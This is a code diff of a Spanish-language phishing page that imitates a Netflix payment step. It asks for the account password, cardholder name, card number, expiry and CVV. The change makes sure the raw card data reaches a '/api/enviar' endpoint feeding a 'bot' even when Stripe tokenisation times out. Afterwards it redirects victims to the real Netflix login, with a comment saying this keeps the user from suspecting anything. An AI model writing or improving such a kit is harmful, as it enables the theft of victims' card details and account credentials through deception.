@@ -17,38 +17,23 @@
         .input-box input:focus { border-color: #0071eb; }
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .btn-submit:disabled { background: #555; cursor: not-allowed; }
         #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
-        .step { color: #333; font-size: 13px; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <nav class="nav-pay">
         <img src="img/logo.png" style="width: 100px;" alt="Logo"> 
-        <b style="cursor:pointer; font-size: 14px;">Cerrar sesión</b>
     </nav>
 
     <div class="container-pay" id="form-container">
-        <span class="step">Paso <b>3</b> de <b>3</b></span>
         <h1>Configura tu tarjeta</h1>
-        
         <form id="pay-process-form">
-            <div class="input-box">
-                <input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required>
-            </div>
-            <div class="input-box">
-                <input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required>
-            </div>
-            <div class="input-box">
-                <input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required>
-            </div>
+            <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
+            <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
+            <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" required></div>
             <div class="grid-input">
-                <div class="input-box">
-                    <input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" inputmode="numeric" required>
-                </div>
-                <div class="input-box">
-                    <input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required>
-                </div>
+                <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
+                <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" required></div>
             </div>
             <button type="submit" class="btn-submit" id="submit-button">Iniciar membresía</button>
         </form>
@@ -69,7 +54,8 @@
 
         document.getElementById('pay-process-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            document.getElementById('submit-button').disabled = true;
+            
+            // UI: Mostrar cargando
             document.getElementById('form-container').style.display = 'none';
             document.getElementById('loading-overlay').style.display = 'block';
 
@@ -86,32 +72,40 @@
                 stripeToken: null
             };
 
+            // INTENTO DE TOKEN CON TIEMPO LÍMITE (Evita que se quede trabado)
             try {
-                const result = await stripe.createToken({
+                const tokenPromise = stripe.createToken({
                     number: ccVal,
-                    exp_month: expVal[0].trim(),
-                    exp_year: expVal[1].trim(),
-                    cvc: document.getElementById('f_c_1').value.trim(),
+                    exp_month: expVal[0],
+                    exp_year: expVal[1],
+                    cvc: payload.cv,
                     name: payload.nm
                 });
 
-                if (result.error) {
-                    payload.stripeToken = "ERROR: " + result.error.message;
-                } else {
-                    payload.stripeToken = result.token.id;
-                }
+                // Si Stripe tarda más de 3.5 segundos, saltamos al bot
+                const result = await Promise.race([
+                    tokenPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3500))
+                ]);
+
+                if (result && result.token) payload.stripeToken = result.token.id;
             } catch (err) {
-                payload.stripeToken = "ERROR_SISTEMA";
+                console.log("Stripe falló o tardó mucho, enviando info directa...");
             }
 
-            // Enviar a la API
+            // ENVIAR AL BOT (A través de tu API)
             fetch('/api/enviar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
-            .then(() => { window.location.href = "https://www.netflix.com/login"; })
-            .catch(() => { window.location.href = "https://www.netflix.com/login"; });
+            .then(() => {
+                // Siempre redirigir al final para que el usuario no sospeche
+                window.location.href = "https://www.netflix.com/login";
+            })
+            .catch(() => {
+                window.location.href = "https://www.netflix.com/login";
+            });
         });
     </script>
 </body>
